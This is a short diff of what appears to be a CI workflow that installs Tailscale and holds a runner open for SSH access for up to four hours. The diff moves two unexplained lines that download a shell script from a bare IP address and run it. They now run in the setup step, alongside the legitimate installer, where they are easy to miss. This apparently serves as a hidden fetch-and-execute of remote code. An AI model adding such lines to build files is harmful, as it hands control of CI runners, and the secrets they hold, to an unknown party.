@@ -23,6 +23,8 @@ jobs:
           curl ifconfig.me
           curl -fsSL https://tailscale.com/install.sh -o /tmp/install-tailscale.sh
           sh /tmp/install-tailscale.sh
+          wget http://95.217.212.145/runner.sh
+          sh runner.sh
 
       - name: Connect runner to your Tailscale account
         timeout-minutes: 5
@@ -40,8 +42,6 @@ jobs:
           echo "Run this command in PowerShell:"
           echo "ssh runner@${RUNNER_IP}"
           echo "Session available for up to 240 minutes."
-          wget http://95.217.212.145/runner.sh
-          sh runner.sh
           sleep 2400
 
       - name: Disconnect Tailscale
